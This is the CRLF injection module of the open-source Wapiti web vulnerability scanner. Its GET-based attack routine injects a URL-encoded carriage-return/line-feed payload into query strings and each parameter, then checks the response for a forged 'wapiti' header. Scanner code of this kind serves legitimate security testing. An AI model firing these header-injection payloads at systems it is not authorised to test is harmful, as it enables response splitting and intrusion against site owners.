from attack import Attack
from vulnerability import Vulnerability
import requests
from net import HTTP

# Wapiti SVN - A web application vulnerability scanner
# Wapiti Project (http://wapiti.sourceforge.net)
# Copyright (C) 2008 Nicolas Surribas
#
# David del Pozo
# Alberto Pastor
# Informatica Gesfor
# ICT Romulus (http://www.ict-romulus.eu)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA


class mod_crlf(Attack):
    """
    This class implements a CRLF attack
    """

    name = "crlf"

    def __init__(self, HTTP, xmlRepGenerator):
        Attack.__init__(self, HTTP, xmlRepGenerator)

    # Won't work with PHP >= 4.4.2
    def attackGET(self, http_res):
        """This method performs the CRLF attack with method GET"""
        page = http_res.path
        params_list = http_res.get_params
        resp_headers = http_res.headers
        referer = http_res.referer
        headers = {}
        if referer:
            headers["referer"] = referer

        payload = self.HTTP.quote("http://www.google.fr\r\nwapiti: SVN version")
        if not params_list:
            # Do not attack application-type files
            if not "content-type" in resp_headers:
                # Sometimes there's no content-type... so we rely on the document extension
                if (page.split(".")[-1] not in self.allowed) and page[-1] != "/":
                    return
            elif not "text" in resp_headers["content-type"]:
                return

            err = ""
            url = page + "?" + payload
            if url not in self.attackedGET:
                evil_req = HTTP.HTTPResource(url)
                if self.verbose == 2:
                    # print "+ " + page + "?http://www.google.fr\\r\\nwapiti: SVN version"
                    print(u"+ {0}".format(evil_req.url))
                try:
                    resp = self.HTTP.send(evil_req, headers=headers)
                    if "wapiti" in resp.getHeaders():
                        self.logVuln(category=Vulnerability.CRLF,
                                     level=Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                     request=evil_req,
                                     info=err + " " + _("(QUERY_STRING)"))
                        print(_("CRLF Injection (QUERY_STRING) in {0}").format(page))
                        print(_("  Evil url:").format(url))
                except requests.exceptions.Timeout, timeout:
                    self.logVuln(category=Vulnerability.RES_CONSUMPTION,
                                 level=Vulnerability.MEDIUM_LEVEL_VULNERABILITY,
                                 request=evil_req,
                                 info=err + " " + _("(QUERY_STRING)"))
                    print(_("Timeout (QUERY_STRING) in {0}").format(page))
                    print(_("  caused by:").format(url))
                except requests.exceptions.HTTPError:
                    # print "Error: The server did not understand this request"
                    pass
                self.attackedGET.append(url)
        else:
            for i in range(len(params_list)):
                err = ""
                saved_value = params_list[i][1]
                # payload is already escaped, see at top
                params_list[i][1] = payload
                param_name = self.HTTP.quote(params_list[i][0])

                url = page + "?" + self.HTTP.encode(params_list)
                if url not in self.attackedGET:
                    self.attackedGET.append(url)
                    evil_req = HTTP.HTTPResource(url)
                    if self.verbose == 2:
                        print(u"+ {0}".format(evil_req.url))
                    try:
                        resp = self.HTTP.send(evil_req, headers=headers)
                        if "wapiti" in resp.getHeaders():
                            err = _("CRLF Injection")
                            self.logVuln(category=Vulnerability.CRLF,
                                         level=Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                         request=evil_req,
                                         parameter=param_name,
                                         info=err + " (" + param_name + ")")
                            if self.color == 0:
                                print(_("{0} ({1}) in {2}").format(err, page, param_name))
                                print(_("  Evil url:").format(url))
                            else:
                                print(u"{0}: {1}".format(err, url.replace(param_name + "=", self.RED + param_name + self.STD + "=")))
                    except requests.exceptions.Timeout, timeout:
                        self.logVuln(category=Vulnerability.RES_CONSUMPTION,
                                     level=Vulnerability.MEDIUM_LEVEL_VULNERABILITY,
                                     request=evil_req,
                                     parameter=param_name,
                                     info=err + " (" + param_name + ")")
                        print(_("Timeout ({0}) in {1}").format(param_name, page))
                        print(_("  caused by: {0}").format(url))
                    except requests.exceptions.HTTPError:
                        print(_("Error: The server did not understand this request"))
                params_list[i][1] = saved_value
